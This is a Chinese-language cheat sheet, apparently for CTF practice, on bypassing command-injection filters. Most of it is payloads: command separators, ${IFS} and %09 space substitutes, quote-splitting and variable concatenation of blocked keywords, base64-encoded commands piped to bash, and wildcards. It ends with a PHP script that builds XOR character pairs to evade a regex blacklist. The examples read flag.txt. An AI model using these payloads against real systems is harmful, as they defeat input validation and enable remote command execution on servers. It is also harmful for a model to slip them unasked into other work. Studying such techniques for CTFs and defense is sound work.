# Bypass (绕过)

[TOC]

---

### 多个命令执行

- `;`
- `\n   (%0a)`



### 空格Bypass

在过滤了空格的系统中，以cat flag.txt为例，系统不允许我们输入空格或输入后被过滤。

- **${IFS}**
- $IFS$9

可使用${IFS}代替空格。

```php
cat${IFS}flag.txt
cat$IFS$1flag.txt
cat${IFS}$1flag.txt
```

- **重定向符绕过(<>)**

```php
cat<>flag.txt
cat<flag.txt
```

- **%09(需要php环境)**

php环境下web输入%09等效于空格

```php
cat%09flag.txt
```

- **`%0a`换行符**



### 文件读取

(1)more:一页一页的显示档案内容
(2)less:与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页
(3)head:查看头几行
(4)tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
(5)tail:查看尾几行
(6)nl：显示的时候，顺便输出行号
(7)od:以二进制的方式读取档案内容
(8)vi:一种编辑器，这个也可以查看
(9)vim:一种编辑器，这个也可以查看
(10)sort:可以查看
(11)uniq:可以查看
(12)file -f:报错出具体内容



## 关键字Bypass

### 单双引号

- 单引号----`''`
- 双引号---`""`
- 反斜杠--- `\`

我们可以通过`ca''t ca""t c"a"t ca\t`这样来bypass



### 编码绕过

#### Base64

```php
echo xxxx|base64 -d|bash
```

1. 使用反引号包含base64解码后的命令

```php
echo "Y2F0IGZsYWcudHh0Cg==" | base64 -d
```

2. 将base64解码后的命令通过管道符传递给bash

```php
echo "Y2F0IGZsYWcudHh0Cg==" | base64 -d | bash
```



### 变量拼接

使用shell变量拼接被黑名单限制的关键词

```php
a=c;b=at;c=fl;d=ag;e=.txt;$a$b $c$d$e;
```



### 通配符绕过

- `?`通配符匹配单个字母
- `*`通配符匹配多个字母
- `[x-x]` or  `{x,x,x,x}`



### $1

```php
ca$1t fl$1ag.t$1xt
```



## 异或

### 异或脚本php

> 获取于网上的资源

```php
<?php
$myfile = fopen("text.txt", "w");  //新创建一个文件，也就是rce_or.txt，给他写的权限
$contents="";
for ($i=0; $i < 256; $i++) { 
	for ($j=0; $j <256 ; $j++) { 

		if($i<16){
			$hex_i='0'.dechex($i); //ascii的前16个字符的十六进制应该是01，02，所以在前缀加‘0’
		}
		else{
			$hex_i=dechex($i);  //前16个后面的就不用加0了
		}
		if($j<16){
			$hex_j='0'.dechex($j);   //同理上方
		}
		else{
			$hex_j=dechex($j);      //同理上方
		}
		$preg ='/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;/i';
		if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
					echo "";     //如果有符合条件的就筛掉，输出空格
    }
  
		else{             //可以使用的字符如下
		$a='%'.$hex_i;    //十六进制前加百分号就变成了URL编码格式
		$b='%'.$hex_j;
		$c=(urldecode($a)^urldecode($b));  //urldecode函数是解URL编码，把他们变成字符串，这里是字符串进行按位或运算，按位或运算后，可以得到新的字符，如%21和%00进行按位或就变成了!,这样我们就可以使用感叹号,就类似于合成新的字符
		if (ord($c)>=32&ord($c)<=126) {          //ord函数是将字符变成ASCII码
			$contents=$contents.$c." ".$a." ".$b."\n";     //每次到这里都写入刚刚建立的文本内
		}
	}

}
}
fwrite($myfile,$contents);
fclose($myfile);
?>
```

